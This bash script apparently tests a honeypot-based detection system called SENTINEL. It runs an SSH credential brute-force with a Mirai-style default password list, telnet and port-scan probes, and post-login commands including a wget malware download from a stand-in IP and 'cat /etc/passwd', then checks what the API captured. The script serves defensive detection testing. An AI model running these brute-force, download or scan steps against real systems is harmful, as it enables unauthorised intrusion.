#!/usr/bin/env bash
# SENTINEL — Attack Simulation & Detection Test
#
# Runs real attacks against the honeypots and the network, then checks the
# API to confirm what SENTINEL actually captured and detected. Everything
# targets your OWN honeypots / your OWN network only.
#
#   bash attack_test.sh            # run all attacks + verify
#   bash attack_test.sh --ssh      # only the Cowrie SSH brute-force
#   bash attack_test.sh --scan     # only the port scan
#
# Requires the honeypots to be running (bash run.sh starts them).

set -uo pipefail
cd "$(dirname "$0")"

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'
API="http://localhost:8000"

# Honeypots run in bridge mode on the host IP (see start_honeypots.sh).
HOST_IP="$(ip -4 -o addr show "$(ip route show default | awk '/default/{print $5;exit}')" 2>/dev/null | awk '{print $4}' | cut -d/ -f1 | head -1)"
HOST_IP="${HOST_IP:-127.0.0.1}"
SSH_PORT=2222
TELNET_PORT=2223

ONLY="${1:-all}"

hr()   { echo -e "${CYAN}────────────────────────────────────────────────────────────${NC}"; }
step() { echo -e "\n${BOLD}$1${NC}"; }
ok()   { echo -e "  ${GREEN}✓${NC} $1"; }
bad()  { echo -e "  ${RED}✗${NC} $1"; }
info() { echo -e "  ${CYAN}·${NC} $1"; }

# ── Preflight ────────────────────────────────────────────────────
preflight() {
  step "Preflight"

  if ! curl -sf "$API/api/health" >/dev/null 2>&1; then
    bad "API not reachable at $API — start it with: bash run.sh"
    exit 1
  fi
  ok "API is up"

  if ! nc -z -w2 "$HOST_IP" "$SSH_PORT" 2>/dev/null; then
    bad "Cowrie SSH honeypot not listening on $HOST_IP:$SSH_PORT"
    echo -e "     Start the honeypots first:  ${CYAN}bash run.sh${NC}"
    echo -e "     (or just the honeypots:     ${CYAN}bash start_honeypots.sh${NC})"
    echo -e "     Then re-run this script."
    exit 1
  fi
  ok "Cowrie honeypot is listening on $HOST_IP:$SSH_PORT"
}

# ── Attack 1: SSH brute force against Cowrie ─────────────────────
attack_ssh() {
  step "Attack 1 — SSH brute-force against Cowrie ($HOST_IP:$SSH_PORT)"
  info "Simulating a Mirai-style credential-stuffing bot"

  # Classic IoT botnet credential list
  local creds=("root:root" "root:123456" "admin:admin" "root:admin"
               "admin:password" "root:toor" "admin:1234" "root:")

  if command -v hydra >/dev/null 2>&1; then
    info "Using hydra"
    printf '%s\n' "${creds[@]%%:*}" | sort -u > /tmp/sentinel_users.txt
    printf '%s\n' "${creds[@]##*:}" | sort -u > /tmp/sentinel_pass.txt
    hydra -L /tmp/sentinel_users.txt -P /tmp/sentinel_pass.txt \
          -s "$SSH_PORT" -t 4 -f -o /tmp/sentinel_hydra.out \
          "ssh://$HOST_IP" 2>/dev/null | grep -E "login:|host:" | head -5
    rm -f /tmp/sentinel_users.txt /tmp/sentinel_pass.txt
    ok "hydra brute-force completed"
  else
    info "hydra not found — using sshpass/ssh loop"
    for pair in "${creds[@]}"; do
      local user="${pair%%:*}" pass="${pair##*:}"
      if command -v sshpass >/dev/null 2>&1; then
        sshpass -p "$pass" ssh -p "$SSH_PORT" -o StrictHostKeyChecking=no \
          -o UserKnownHostsFile=/dev/null -o ConnectTimeout=4 \
          "$user@$HOST_IP" "exit" >/dev/null 2>&1
      else
        # No sshpass: at least open the TCP/SSH handshake so Cowrie logs the attempt
        ssh -p "$SSH_PORT" -o StrictHostKeyChecking=no \
          -o UserKnownHostsFile=/dev/null -o ConnectTimeout=4 \
          -o PreferredAuthentications=password -o NumberOfPasswordPrompts=1 \
          "$user@$HOST_IP" "exit" >/dev/null 2>&1 </dev/null
      fi
      echo -ne "  ${YELLOW}→${NC} tried $user:$pass\r"
    done
    echo
    ok "credential sweep completed (${#creds[@]} pairs)"
  fi
}

# ── Attack 2: post-login commands (Cowrie accepts root:root) ─────
attack_commands() {
  step "Attack 2 — Malicious commands inside the honeypot"
  info "Cowrie accepts root:root; running Mirai-style payload commands"

  if ! command -v sshpass >/dev/null 2>&1; then
    info "sshpass not installed — skipping (install: sudo apt install sshpass)"
    return
  fi

  # Cowrie's default userdb DENIES root:root but accepts root with any other
  # password, and it only logs commands from an interactive shell — SSH "exec"
  # requests (ssh host "cmd") are refused. So force a PTY (-tt) and feed the
  # payload on stdin, one command per line, exactly as a real intruder would.
  sshpass -p 's3cr3t' ssh -tt -p "$SSH_PORT" -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 root@"$HOST_IP" \
    >/dev/null 2>&1 <<'CMDS'
uname -a
cat /proc/cpuinfo | head
wget http://203.0.113.99/mirai.arm
chmod +x mirai.arm
busybox
cat /etc/passwd
exit
CMDS
  ok "executed recon + malware-download commands in session"
}

# ── Attack 3: Telnet probe ───────────────────────────────────────
attack_telnet() {
  step "Attack 3 — Telnet probe ($HOST_IP:$TELNET_PORT)"
  if nc -z -w2 "$HOST_IP" "$TELNET_PORT" 2>/dev/null; then
    (sleep 1; echo "root"; sleep 1; echo "root"; sleep 1; echo "enable"; sleep 1) \
      | timeout 8 nc "$HOST_IP" "$TELNET_PORT" >/dev/null 2>&1
    ok "telnet session opened against honeypot"
  else
    info "Telnet honeypot not listening — skipping"
  fi
}

# ── Attack 4: Port scan (recon) ──────────────────────────────────
attack_scan() {
  step "Attack 4 — Port scan against gateway (recon / T0842)"
  local target; target="$(ip route show default | awk '/default/{print $3;exit}')"
  info "Scanning $target — this is the traffic the capture engine sees"

  if command -v nmap >/dev/null 2>&1; then
    # -sT connect scan needs no root; -T4 fast
    nmap -sT -T4 --top-ports 20 "$target" 2>/dev/null | grep -E "open|scanned" | head -5
    ok "nmap scan completed"
  else
    info "nmap not found — using a bash TCP sweep"
    for p in 22 23 80 443 8080 554; do
      timeout 1 bash -c "echo >/dev/tcp/$target/$p" 2>/dev/null && echo "  port $p open"
    done
    ok "TCP sweep completed"
  fi
}

# ── Verify what SENTINEL captured ────────────────────────────────
verify() {
  step "Verifying detection — polling SENTINEL API"
  info "Waiting 5s for logs to flush and the pipeline to process…"
  sleep 5

  # Honeypot sessions
  local hp; hp="$(curl -s -m 8 "$API/api/honeypots/sessions" 2>/dev/null)"
  local n_sessions; n_sessions="$(echo "$hp" | python3 -c "import json,sys; print(len(json.load(sys.stdin)))" 2>/dev/null || echo 0)"

  hr
  if [ "$n_sessions" -gt 0 ]; then
    ok "Honeypot captured ${BOLD}$n_sessions${NC} session(s)"
    echo "$hp" | python3 -c "
import json,sys
data=json.load(sys.stdin)
creds=sum(len(s.get('login_attempts',[])) for s in data)
breached=[s for s in data if s.get('success')]
ips=sorted({s.get('src_ip') for s in data})
cmds=sum(len(s.get('commands',[])) for s in data)
print(f'      Attacker IPs        : {\", \".join(ips)}')
print(f'      Credential attempts : {creds}')
print(f'      Successful logins   : {len(breached)}')
print(f'      Commands captured   : {cmds}')
top=data[0].get('login_attempts',[])[:5]
if top:
    print('      Sample captured creds:')
    for a in top:
        mark='  <-- SUCCESS' if a.get('success') else ''
        print(f'        {a.get(\"username\")}:{a.get(\"password\")}{mark}')
" 2>/dev/null
  else
    bad "No honeypot sessions recorded via API"
    info "If the attack said it connected, check Cowrie logs: deception/cowrie/log/cowrie.json"
  fi

  # Threats
  hr
  local th; th="$(curl -s -m 8 "$API/api/threats" 2>/dev/null)"
  local n_threats; n_threats="$(echo "$th" | python3 -c "import json,sys; print(len(json.load(sys.stdin)))" 2>/dev/null || echo 0)"
  if [ "$n_threats" -gt 0 ]; then
    ok "Threat feed shows ${BOLD}$n_threats${NC} event(s)"
    echo "$th" | python3 -c "
import json,sys
for t in json.load(sys.stdin)[:5]:
    print(f'      SEV{t.get(\"severity\",0):>2}  {t.get(\"tactic\",\"?\")}  {t.get(\"summary\",\"\")[:60]}')
" 2>/dev/null
  else
    info "Threat feed is empty — see the note below on why honeypot hits"
    info "do not (yet) auto-create threat events."
  fi
  hr
}

# ── Run ──────────────────────────────────────────────────────────
echo -e "${BOLD}  SENTINEL — Attack Simulation${NC}"
echo -e "  Target: ${CYAN}$HOST_IP${NC}   $(date '+%H:%M:%S')"

preflight

case "$ONLY" in
  --ssh)     attack_ssh ;;
  --scan)    attack_scan ;;
  --telnet)  attack_telnet ;;
  *)         attack_ssh; attack_commands; attack_telnet; attack_scan ;;
esac

verify

echo -e "\n${BOLD}Done.${NC} Open the ${CYAN}Honeypots${NC} tab in the dashboard to see captured sessions live."
